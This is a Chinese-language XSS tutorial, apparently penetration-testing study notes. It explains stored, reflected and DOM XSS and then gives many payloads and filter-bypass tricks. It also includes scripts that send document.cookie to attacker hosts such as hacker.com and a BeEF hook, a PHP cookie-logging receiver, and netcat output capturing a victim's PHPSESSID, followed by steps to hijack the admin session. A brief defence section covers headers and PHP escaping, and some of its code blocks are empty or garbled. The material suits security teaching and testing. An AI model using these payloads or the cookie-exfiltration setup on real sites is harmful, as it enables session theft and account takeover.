## 1. XSS简介

跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。

XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

## 2. 原理解析

##### 2.1 XSS主要原因：

​	一个良好防御的网络应用的最重要的特点之一是数据清洗，即对用户输入进行处理，去除或转换所有危险的字符或字符串。

​	未经净化的数据输入，会被攻击者注入并潜在地执行恶意代码。当这些未经净化的输入在网页上显示时，就会产生跨站脚本漏洞（XSS）。

##### 2.2 XSS主要分类：

- 存储型XSS（Stored XSS) 又称为持久型跨站点脚本
  - 存储型XSS（Stored XSS) 是一种将恶意代码存储到网站存储介质中的攻击方式。每当用户打开页面时，将触发恶意脚本，由于可以面向所有用户，因此危害性更大。

- 反射型xss攻击（Reflected XSS） 又称为非持久性跨站点脚本攻击
  - 最常见的类型的XSS。反射型xss攻击（Reflected XSS）是一种会与数据库交互的恶意代码触发型xss攻击方式。反射型 XSS 漏洞通常会出现在搜索字段和结果以及任何包含用户输入的错误消息的地方。
- 基于DOM的 XSS
  - 基于DOM的XSS攻击发生在页面的文档对象模型（DOM）内，当用户控制的值修改了DOM时，就可能发生DOM-based XSS攻击。与另外两种的区别在于它发生在浏览器解析页面内容并执行插入的JavaScript时，不需要与后端进行交互即可完成攻击。

## 3. 构造XSS脚本
### 3.1 常用HTML标签

```html
<iframe>    iframe 元素会创建包含另外一个文档的内联框架（即行内框架）。
<textarea>  <textarea> 标签定义多行的文本输入控件。
<img>       img 元素向网页中嵌入一幅图像。
<script>    <script> 标签用于定义客户端脚本，比如 JavaScript。script元素既可以包含脚本语句，也可以通过 src属性指向外部脚本文件。必需的type属性规定脚本的MIME类型。JavaScript的常见应用时图像操作、表单验证以及动态内容更新。
```

### 3.2 常用JavaScript方法

```html
alert              alert() 方法用于显示带有一条消息和一个确认按钮的警告框
window.location    window.location 对象用于获得当前页面的地址 (URL)，并把浏览器重定向到新的页面。
document.location
location.href      返回当前显示的文档的完整 URL
onload             一张页面或一幅图像完成加载
onsubmit           确认按钮被点击
onerror            在加载文档或图像时发生错误
document.cookie	   获取cookie
```
### 3.3 构造XSS脚本

```html
弹框警告

此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号', 一旦此脚本能执行，也就意

味着后端服务器没有对特殊字符做过滤<>/' 这样就可以证明，这个页面位置存在了XSS漏洞。

<script>alert('xss')</script>

<script>alert(document.cookie)</script>

页面嵌套

<iframe src=http://www.baidu.com width=300 height=300></iframe>

<iframe src=http://www.baidu.com width=0 height=0 border=0></iframe>

页面重定向

<script>window.location="http://www.qfedu.com"</script>

<script>location.href="http://www.baidu.com"</script>

弹框警告并重定向

<script>alert("请移步到我们的新站");location.href="http://www.qfedu.com"</script>

<script>alert('xss');location.href="http://10.1.64.35/mutillidae/robots.txt"</script>

这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信

息，则可能在另外的站点重新登录账户（克隆网站收集账户）

访问恶意代码

<script src="http://www.qfedu.com/xss.js"></script>

<script src="http://BeEF_IP:3000/hook.js"></script> #结合BeEF收集用户的cookie

巧用图片标签

<img src="#" onerror=alert('xss')>

<img src="javascript:alert('xss');">

<img src="http://BeEF_IP:3000/hook.js"></img>

绕开过滤的脚本

大小写 <ScrIpt>alert('xss')</SCRipt>

字符编码 采用URL、Base64等编码

<a

href="javascript:alert

;("xss")">yangge</a>

收集用户cookie

打开新窗口并且采用本地cookie访问目标网页，打开新窗口并且采用本地cookie访问目标网页。

<script>window.open("http://www.hacker.com/cookie.php?cookie="+document.cookie)</script>

<script>document.location="http://www.hacker.com/cookie.php?cookie="+document.cookie</script>

<script>new Image().src="http://www.hacker.com/cookie.php?cookie="+document.cookie;</script>

<img src="http://www.hacker.com/cookie.php?cookie='+document.cookie"></img>

<iframe src="http://www.hacker.com/cookie.php?cookie='+document.cookie"></iframe>
<script>new Image().src="http://www.hacker.com/cookie.php?cookie='+document.cookie";

img.width = 0;

img.height = 0;

</script>
```

## 3. 利用演示

##### 0 XSS寻找（黑盒测试）

```
尽可能找到一切用户可控并且能够输出在页面代码中的提交框，要按照其作用原理来判断可能存在的漏洞类型：
		1、会将数据存入数据库的提交框
		2、会与数据库交互的提交框
		3、与页面js交互的提交框

搜索目标：
	URL的每一个参数、URL本身、表单、搜索框、常见业务场景
	重灾区：发布文章、发布帖子、评论区、留言区、个人信息、订单信息、添加文章标签等
	针对型：站内信、网页即时通讯、私信、意见反馈
	存在风险：搜索框、当前目录、图片属性等
```

##### 1 注入点判断

在评论框、提交框等输入栏内插入xss payload进行测试：

```html
1、输入字符测试
< > ' " { } ; ()


2、弹框警告测试：
<script>alert(1)</script>
<script>alert`1`</script>		//过滤括号，使用反引号来代替括号
<SCRIPT>alert(1)</SCRIPT>
<script src=x onerror=alert(1)></script> //引入x,由于x不存在,触发οnerrοr函数,进行弹框
<script src='http://www.test.com/probe.js'></script>//直接引入到攻击者的后台网站(可以直接用beef)
<script type="text/javascript">alert(1)</script>
<img src=x onerror=alert(1)> //img插入图片,οnerrοr为加载失败执行命令,触发弹框
<svg/onload=alert(1)>		    //svg标签插入图形,onload表示页面加载完成,触发弹框
<video src=x onerror=alert(1)>  //插入视频时,错误就触发弹框
<audio src=x onerror=alert(1)>  //插入声音时,错误就触发弹框
<a href="javascript:alert('1')">2</a> //创建标签2，点击触发弹窗
    如果你在输入框中输入的代码直接出现在a标签的href属性里面，那就直接写javascript:alert(/xss/)
<iframe src="javascript:alert(1)"></iframe>  //用伪协议进行弹框,火狐/IE/谷歌都支持
```

发布后会出现xss弹窗，证明存在XSS注入

##### 2 基础利用方法

利用分为两类:在标签内,还是标签外.

- 如果在标签外,就想办法先闭合标签,再构造\<script\>标签;
- 如果在标签内,就想办法闭合本标签,构造JS事件或伪协议的方式来触发XSS;

**弹框警告**

```html
此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号', 一旦此脚本能执行，也就意味着后端服务器没有对特殊字符做过滤<>/' 这样就可以证明，这个页面位置存在了XSS漏洞。

<script>alert('xss')</script>
<script>alert(document.cookie)</script>
```

**页面嵌套**

```html
<iframe src=http://www.baidu.com width=300 height=300></iframe>
<iframe src=http://www.baidu.com width=0 height=0 border=0></iframe>
```

**页面重定向**

```html
<script>window.location="http://www.qfedu.com"</script>
<script>location.href="http://www.baidu.com"</script>
```

**弹框警告并重定向**

```html
<script>alert("请移步到我们的新站");location.href="http://www.qfedu.com"</script>
<script>alert('xss');location.href="http://10.1.64.35/mutillidae/robots.txt"</script>

这里结合了一些社工的思路
例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户（克隆网站收集账户）
```

**访问恶意代码**

```html
<script src="http://www.qfedu.com/xss.js"></script>
<script src="http://BeEF_IP:3000/hook.js"></script> #结合BeEF收集用户的cookie
```

**巧用图片标签**

```html
<img src=x onerror=alert('xss')>
<img src="javascript:alert('xss');">
<img src="http://BeEF_IP:3000/hook.js"></img>

<svg οnlοad=alert(1)>
```

**巧用视频标签**

```html
<video src=x onerror=alert(1)>  //插入视频时,错误就触发弹框
```

**巧用音频标签**

```html
<audio src=x onerror=alert(1)>  //插入声音时,错误就触发弹框
```

JS**伪协议**

```php+HTML
<a href="javascript:alert('1')">2</a> //创建标签2，点击触发弹窗
<iframe src="javascript:alert(1)"></iframe>  //用伪协议进行弹框,火狐/IE/谷歌都支持
```

##### 4 收集用户cookie

打开新窗口并且采用本地cookie访问目标网页，打开新窗口并且采用本地cookie访问目标网页。

```html
<script>alert(document.cookie)</script>
<script>window.open("http://www.hacker.com/cookie.php?cookie="+document.cookie)</script>
<script>document.location="http://www.hacker.com/cookie.php?cookie="+document.cookie</script>
<script>new Image().src="http://www.hacker.com/cookie.php?cookie="+document.cookie;</script>
<img src="http://www.hacker.com/cookie.php?cookie='+document.cookie"></img>
<iframe src="http://www.hacker.com/cookie.php?cookie='+document.cookie"></iframe>
<script>new Image().src="http://www.hacker.com/cookie.php?cookie='+document.cookie";
img.width = 0;
img.height = 0;
</script>
```



**1>搭建web站点，用来接收用户cookie**

开启apache服务，进入/var/www/html文件，写一个用来接收cookie的网页，

cookie.php

```
vim /var/www/html/cookie.php
<?php
$aa = $_GET['cookie'];
$log = fopen("cookie.html","a") or exit("\n File not found!");
fwrite($log,$aa."\n");
fclose($log);
?>
```

创建接收cookie的页面文件

```
cd /var/www/html
touch cookie.html
sudo chown -R www-data:www-data /var/www/
```

apache2服务启动

```
sudo systemctl start apache2
```

测试

```
文件监听：
	tail -f /var/www/html/cookie.html
浏览器访问：
	http://<kali ip>/cookie.php?cookie=5
	看看传入的值有没有保存在 cookie.html里
```

通过渗透机植入XSS代码：

```
<script>window.open('http://192.168.106.140/cookie.php?cookie='+document.cookie)</script>
	会弹出新页面，仅适用于测试

<script>document.location='http://192.168.106.140/cookie.php?cookie='+document.cookie</script>
	页面会重定向至空白页，仅适用于测试
	
	
注： 192.168.106.140 为kali Linux IP
注： 先清除之前植入的XSS代码
```



## 4. 手工注入



##### 内容注入

**重定向注入**

```html
<script>window.location="http://www.qfedu.com"</script>
<script>location.href="http://www.baidu.com"</script>
```

**iframe隐蔽注入**

与重定向相比，注入一个不可见的iframe是一种隐蔽的替代方案。

```html
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
```

iframe用于在当前HTML文档中嵌入另一个文件，如图像或其他HTML文件。在我们的案例中，“report”是一个文件，与我们的攻击者机器上的超链接相连，而且iframe是不可见的，因为高度和宽度都设置为零。一旦提交了这个负载，任何访问该页面的用户都将连接回我们的攻击者机器。为了测试这一点，我们可以在我们的攻击机器上（本例中为10.11.0.4）的80端口上创建一个Netcat监听器，并刷新反馈页面。

```shell
kali@kali:~$ sudo nc -nvlp 80 
[sudo] password for kali: 
listening on [any] 80 ... 
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 41612 
GET /report HTTP/1.1 
Host: 10.11.0.
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.0.22/feedback.php
...
```

正如上面所演示的，浏览器重定向起作用，将受害者浏览器通过iframe发送到我们的攻击机器。同样，受害者不会在其浏览器中看到零大小的iframe。我们可以走得更远，将受害者浏览器重定向到客户端攻击或信息收集脚本。

为了做到这一点，我们首先需要捕获受害者的用户代理头，以帮助识别他们正在使用的浏览器类型。在上面的示例中，我们使用了 Netcat，因为它显示了从浏览器发送的完整请求，包括用户代理头。Apache HTTP服务器也会默认捕获 User-Agent 头在 /var/log/apache2/access.log 中。我们不会执行任何客户端攻击。相反，我们将尝试以管理员用户身份访问 Web 应用程序。

##### 窃取Cookies和Session信息

```
<script>alert(document.cookie)</script>
```

如果应用使用不安全的会话管理配置，我们可以用 XSS 来窃取 cookie 和会话信息，使用窃取的经过身份验证的用户cookie，可以伪装成该用户在目标网站内操作。

网站通常使用 cookie 来跟踪用户的状态和信息。cookie 可以设置几个可选标志，其中有两个对我们作为渗透测试人员来说特别有意义：Secure 和 HttpOnly。

- “Secure”标志指示浏览器仅通过加密连接（如HTTPS）发送cookie，从而保护cookie不被明文发送并在网络上被截取。 
- “HttpOnly”标志指示浏览器拒绝JavaScript访问cookie。如果未设置此标志，则我们可以使用XSS playlad来窃取cookie。

然而，即使没有设置这个标记，仍然需要绕过一些其他浏览器控件，因为浏览器安全规定一个域设置的 Cookie 不能直接发送给另一个域。顺便提一下，通过在 Set-Cookie 指令中使用 Domain 和 Path 标记，可以放宽子域的限制。为了解决这个问题，如果 JavaScript 可以访问 Cookie 值，我们可以将其作为链接的一部分发送，并发送该链接，然后可以拆解链接以检索 Cookie 值。

我们将使用JavaScript读取cookie的值，并将其附加到链接回我们攻击机的图像URL。浏览器将读取图像标记并发送一个GET请求到我们的攻击系统，其中受害者的cookie作为URL查询字符串的一部分。

为了实施我们的Cookie窃取器，我们需要按以下方式修改我们的XSS playlad：

```html
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

一旦我们向应用程序提交了此playlad，我们只需要等待经过身份验证的用户访问该应用程序，以便我们可以窃取PHPSESSID cookie。

当我们的受害者浏览所影响的页面时，他们的浏览器将使用经过验证的会话ID值与我们建立连接：

```shell
kali@kali:~$ sudo nc -nvlp 80
listening on [any] 80 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 53824
GET /cool.jpg?output=PHPSESSID=ua19spmd8i3t1l9acl9m2tfi76 HTTP/1.1
Referer: http://127.0.0.1/admin.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
...
```

现在我们有了已认证的会话ID，我们需要将其设置到我们的浏览器中。

使用Cookie-Editor浏览器插件来设置和操作Cookie。（在https://addons.mozilla.org/zh-CN/firefox/addon/cookie-editor/页面安装插件）

F12，点击Cookie-Editor打开插件，点击“add”按钮，粘贴窃取到的Cookie值，点击“add”保存。添加了 cookie 值以后，就可以在不提供任何凭据的情况下访问目标的相应管理界面。

访问时，如果我们不被重定向到登录页面，并且在反馈项旁边有“删除”按钮。表明我们已成功劫持了管理用户的会话。

请注意，这种攻击是特定于会话的。一旦我们窃取了会话，我们就可以假扮受害者直到他们退出或会话过期。

#### 3 过滤绕过

- [XSS过滤绕过速查表](https://blog.csdn.net/weixin_50464560/article/details/114491500)
- [反射型XSS(按ctrl键点我跳转)](https://www.freebuf.com/articles/web/276998.html#1)

##### PHP htmlspecialchars函数

​	用于处理在 HTML 上下文中显示的字符串，以防止 XSS（跨站脚本攻击）漏洞。它将特殊字符（如<、>、&和"）转换为它们的HTML实体。

​	具有三个参数，第一个参数为必选参数，表示待处理的字符串，第二个参数为可选参数，专门针对字符串中的引号操作，默认值：ENT_COMPAT，只转换双引号。ENT_QUOTS,单引号和双引号同时转换。ENT_NOQUOTES，不对引号进行转换。第三个参数为处理字符串的指定字符集


```

	
不正确的上下文使用：htmlspecialchars函数只能在HTML上下文中使用，如果在JavaScript或其他上下文中使用，仍然可能存在XSS漏洞。
针对特定浏览器的漏洞：在某些情况下，特定的浏览器可能存在解析HTML实体的不一致性，这可能会导致XSS漏洞
```

遗漏单引号（'）

```
源码如下：
	<?php
	$name = $_GET["name"];
	$name = htmlspecialchars($name);
	?>
	<input type='text' value='<?php echo $name?>'>;

源码分析：
	htmlspecialchars默认不转义单引号，只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号

绕过方法：
	xxx.php?name=' onmouseover='alert(xss)
	
修复方法：
	$name = htmlspecialchars($name, ENT_QUOTES);
```



错用htmlspecialchars函数导致的xss

```
源码如下：
	<meta http-equiv=Content-Type content="text/html;charset=gbk">
	<script src="http://wooyun.org/js/jquery-1.4.2.min.js"></script>
	<?php
	$name = $_GET["name"];
	echo "<script type='text/javascript'>
	$(document).ready(function(){
		$('#text').html(".htmlspecialchars($name).");
	})
	</script>";
	?>

源码分析：
	此处调用了html()做输出，仅考虑单引号双引号以及尖括号显然已经不够了，还必须得考虑别的因素在里面，此时应该再使用json_encode()函数进行处理

绕过方法：
	xxx.php?name=alert(xss)
	
修复方法：
	$('#text').html(".json_encode(htmlspecialchars($name)).");
```

浏览器等客户端造成的htmlspecialchars失效

```

```

PHP strip_tags函数

PHP strip_tags（）函数绕过漏洞 `CVE-2004-0595` `CNNVD-200407-076`

```
PHP 4.x到4.3.7版本，以及5.x到5.0.0RC3版本的strip_tags函数，当为允许标签输入限制时不能过滤在标签名称内空(＼0)字符。Web浏览器如Internet Explorer和Safariweb可以处理危险标签，同时忽略空字符以及促进跨站脚本攻击(XSS)漏洞的利用。


```

##### 定位符

```
#<script>alert(1)</script>
```


```
应对场景：
    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    } 
传入的参数如果不是French、English、German、Spanlish这四种字符串的话，就会直接跳到?default=English

使用#定位符，#号后面的字符不会提交给PHP服务器。输入：default=English #<script>alert(1)</script>

```

##### 大小写绕开

```html
<SCRIPT>ALERT('XSS')</SCRIPT>
<SCRIPT>alert('xss')</SCRIPT>
<ScrIpt>alert('xss')</SCRipt>
<ScRiPt>alert('xss')</sCrIpT>
script
ScrIpt
ScrIpt
SCRipt
ScRIPt
SCRIPT

```

##### 双写绕过

```
中间插入式双写绕过
	<scr<script>ipt>alert('xss')</scr</script>ipt>
```

##### 字符编码绕过

采用URL、Base64、html实体等编码

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;">yangge</a>
```

编码工具：

- [CTF在线工具](http://www.hiencode.com/) 
- [爱资料工具网](https://www.toolnb.com/) 

##### 换行绕过

1、规避限制标签闭合的场景

```
</style
>
<script>alert(1)</script>
<style
```

2、应对过滤斜杠的场景，但是要闭合注释，所以和使用换行的方式。

```

alert(1)
-->
```



##### @小技巧

```
http://www.sementfault.com@127.0.0.1/cx.html

以@分隔的话前面表示的是用户名和密码，后面表示的是登录的网站和端口，
也可以以表示重定向到第二个网站。
```

##### 转义符

代码将引号过滤成了实体编码，所以可以使用转义符号将先将\转义

```
\"),alert(1)//
```

#### 扫描工具

专门的XSS扫描工具有很多，像XSSER、XSSF等都很好用

## 5 自动化XSS利用工具

##### 1 BeEF (Browser Exploitation Framework)

[[自动化XSS利用工具-BeEF]]

##### 2 xssor

项目地址：www.xssor.io

##### 3 自建XSS Platform

自己搭建XSS Platform可以参考这篇文章：[https://blog.csdn.net/weixin_50464560/article/details/115355509](https://link.zhihu.com/?target=https%3A//blog.csdn.net/weixin_50464560/article/details/115355509)(其中`BlueLotus_XSSReceiver(蓝莲花)`的搭建和源码也在里面，如何使用在其中的READEME.md里，还有这篇会更加详细：[https://blog.csdn.net/weixin_50464560/article/details/115360092](https://link.zhihu.com/?target=https%3A//blog.csdn.net/weixin_50464560/article/details/115360092)）

##### 4 IE Tester



## 6 XSS防御

##### 1 X-Frame-Options：

X-Frame-Options是一个HTTP标头（header），用来告诉浏览器这个网页是否可以放在iFrame内
两个参数：（作用与上面一致）

```
1. SAMEORIGIN
2. DENY
```

例如：

```
1. X-Frame-Options: DENY
2. X-Frame-Options: SAMEORIGIN
3. X-Frame-Options: ALLOW-FROM http://caibaojian.com/
```

 第一个例子告诉浏览器不要（DENY）把这个网页放在iFrame内，通常的目的就是要帮助用户对抗点击劫持。

 第二个例子告诉浏览器只有当架设iFrame的网站与发出X-Frame-Options的网站相同，才能显示发出X-Frame-Options网页的内容。

 第三个例子告诉浏览器这个网页只能放在http://caibaojian.com//网页架设的iFrame内。 不指定X-Frame-Options的网页等同表示它可以放在任何iFrame内。 X-Frame-Options可以保障你的网页不会被放在恶意网站设定的iFrame内，令用户成为点击劫持的受害人。

**作用：**

 X-Frame-Options HTTP响应头是用来确认是否浏览器可以在frame或iframe标签中渲染一个页面，网站可以用这个头来保证他们的内容不会被嵌入到其它网站中，以来避免点击劫持。

 **危害：**

 攻击者可以使用一个透明的、不可见的iframe，覆盖在目标网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击iframe页面的一些功能性按钮上，导致被劫持。

##### 2 X-XSS-Protection：

这个响应头是用来防范XSS的。当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。现在主流浏览器都支持，并且默认都开启了XSS保护，用这个header可以关闭它。它有几种配置：

- 0：禁用XSS保护；
- 1：启用XSS保护；
- 1：mode=block：启用XSS保护，并在检查到XSS攻击时，停止渲染页面（例如IE8中，检查到攻击时，整个页面会被一个#替换）

浏览器提供的XSS保护机制并不完美，但是开启后仍然可以提升攻击难度，总之没有特别的理由，不要关闭它。

##### 3 X-Content-Type-Options：

该消息头最初是由微软在 IE 8 浏览器中引入的，提供给网站管理员用作禁用内容嗅探的手段，内容嗅探技术可能会把不可执行的 MIME 类型转变为可执行的 MIME 类型。

##### 4 MIME 类型：

媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型）是一种标准，用来表示文档、文件或字节流的性质和格式。浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理 URL，因此 Web 服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。

##### 5 PHP防御函数

preg_replace 正则匹配替换

```
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 
```

PHP htmlspecialchars函数  将特殊字符（如<、>、&和"）转换为它们的HTML实体

```
$name = htmlspecialchars($name, ENT_QUOTES);
```

PHP strip_tags函数

```

```



#### 参考资料

- https://blog.csdn.net/weixin_44770698/article/details/124779271
- http://t.csdnimg.cn/v5wBb
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

